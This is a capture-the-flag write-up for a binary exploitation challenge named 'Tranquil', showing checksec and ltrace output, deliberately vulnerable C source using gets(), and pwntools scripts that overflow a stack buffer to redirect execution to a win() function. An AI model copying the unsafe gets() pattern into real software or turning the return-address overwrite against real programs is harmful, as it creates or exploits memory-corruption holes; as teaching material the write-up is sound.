# Tranquil (pwn)

This is challenge 2 in the pwn section. Like last time, you will have to make your own ```flag.txt``` file to test with.

We were again given the binary along with the source code so lets start by checking out the binary:

``` Bash
$ file tranquil
tranquil: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a9aff78641655f347b0c78da560e5a67d41b14bd, for GNU/Linux 4.4.0, not stripped

$ checksec --file=tranquil
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   53 Symbols        No    0               3               tranquil
```

This time we see that it is still a 64-bit binary but doesn't have a stack canary. This tells us we will likely be doing some type of buffer overflow, but not injecting shellcode since the stack is marked as non-executable. Lets run the binary and try to get a seg fault:

``` Bash
$ ./tranquil
Enter the secret word: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Login failed!
zsh: segmentation fault  ./tranquil
```

 We see that we can successfully get it to seg fault which tells us we will be overflowing the buffer. Lets run ```ltrace``` and see what we can find:
 
 ``` Bash
 $ ltrace ./tranquil
 setbuf(0x7fcbf8ce5760, 0)                                                                                = <void>
setbuf(0x7fcbf8ce5680, 0)                                                                                = <void>
puts("Enter the secret word: "Enter the secret word: 
)                                                                          = 24
gets(0x7ffd84dcfb10, 1, 1, 0x7fcbf8c0a190password123
)                                                               = 0x7ffd84dcfb10
strcmp("password123", "password123")                                                                     = 0
puts("Logged in! The flag is somewhere"...Logged in! The flag is somewhere else though...
)                                                              = 48
+++ exited (status 0) +++
```
We see that we are comparing the user input to the string ```password123``` but passing that password in doesn't seem to do anything. It tells us that the flag is somewhere else, leading us to look into a return to win style challenge. Lets open the source code:

``` C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int win(){
    char flag[128];
    
    FILE *file = fopen("flag.txt","r");
    
    if (!file) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    
    fgets(flag, 128, file);
    
    puts(flag);
}





int vuln(){
    char password[64];
    
    puts("Enter the secret word: ");
    
    gets(&password);
    
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! The flag is somewhere else though...");
    } else {
        puts("Login failed!");
    }
    
    return 0;
}


int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();
    
    // not so easy for you!
    // win();
    
    return 0;
}
```
As we thought, we see that there is a function called ```win()``` that is not being called at all and prints our flag. This tells us we need to overflow the buffer in ```vuln()``` and change the return address to this ```win()``` function. If you look through this writeup (https://github.com/sampatti37/crypto-cat-binary-exploitations-101/blob/main/level03.md) I describe how to go through this process manually, but for this challenge, I am just going to script it. 

We will start with our standard python exploit template and then add the following to our custom exploit section:

``` Python3
io = start

offset = find_ip(cyclic(200))
```
This will start our program and find the ```$rip``` offset for us so we can overwrite it. Next, we need to get the address for our ```win()``` function. We can either use ```gdb``` and run the ```info functions``` command and copy the actual address or use the ```elf.symbols.win``` method in pwntools (I'll show both ways). 

Next, we need to package this up in our payload, write it to a file and send it off to the binary. After all this, our exploit will look like this:

``` Python3
io = start()

offset = find_ip(cyclic(200))

win = 0x0000000000401196
# win = elf.symbols.win

payload = flat (
    offset * asm('nop'),
    win
)

write("payload", payload)

io.sendlineafter(b':', payload)

io.interactive()
```
 If we now run this with logging set to ```error```, we see:
 
 ``` Bash
 $ python exploit.py
 Login failed!
flag{you_got_it}
```
We still get the login failed message but we get our flag! If we want to successfully login AND get the flag, we can modify our payload to look like this:

``` Python3
io = start()

offset = find_ip(cyclic(200))

password = b"password123" + b"\x00" * (offset - 11)

win = 0x0000000000401196
# win = elf.symbols.win

payload = flat (
    password,
    win
)

write("payload", payload)

io.sendlineafter(b':', payload)

io.interactive()
```
Now when we run, we see that we successfully logged in AND got our flag!

``` Bash
$ python exploit.py
Logged in! The flag is somewhere else though...
flag{you_got_it}
```
